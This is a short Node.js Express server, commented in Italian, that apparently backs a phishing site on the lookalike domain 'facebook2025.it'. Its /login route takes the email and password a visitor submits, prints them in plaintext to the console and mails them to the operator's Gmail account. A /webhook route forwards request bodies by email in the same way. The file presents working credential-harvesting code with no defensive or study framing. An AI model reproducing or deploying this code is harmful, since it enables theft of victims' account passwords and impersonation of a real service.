const express = require("express");
const path = require("path");
const nodemailer = require("nodemailer");
require("dotenv").config();

const app = express();
const PORT = process.env.PORT || 3000;

// 🔁 Redirect da www a root
app.use((req, res, next) => {
  const host = req.headers.host;
  if (host === "www.facebook2025.it") {
    return res.redirect(301, "https://facebook2025.it" + req.url);
  }
  next();
});

// 📦 Serve file statici
app.use(express.static(path.join(__dirname, "public")));

// 🧠 Parsing dati form
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// 📧 Configura Nodemailer
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

// ✅ Ricezione dati login
app.post("/login", async (req, res) => {
  const { email, password } = req.body;
  console.log("🔐 Login ricevuto:", email, password);

  try {
    await transporter.sendMail({
      from: `"Login Notifier" <${process.env.EMAIL_USER}>`,
      to: process.env.EMAIL_USER,
      subject: "Nuovo login ricevuto",
      text: `Email: ${email}\nPassword: ${password}`,
    });

    res.status(200).send("Login ricevuto e email inviata");
  } catch (err) {
    console.error("❌ Errore invio email:", err);
    res.status(500).send("Errore invio email");
  }
});

// ✅ Webhook da Brevo
app.post("/webhook", async (req, res) => {
  console.log("📬 Webhook ricevuto:", req.body);

  try {
    await transporter.sendMail({
      from: `"Webhook Notifier" <${process.env.EMAIL_USER}>`,
      to: process.env.EMAIL_USER,
      subject: "Nuovo webhook ricevuto",
      text: JSON.stringify(req.body, null, 2),
    });

    res.status(200).send("Webhook ricevuto e email inviata");
  } catch (err) {
    console.error("❌ Errore invio email:", err);
    res.status(500).send("Errore invio email");
  }
});

// 🏠 Homepage
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// 🚀 Avvio server
app.listen(PORT, () => {
  console.log(`✅ Server attivo su http://localhost:${PORT}`);
});
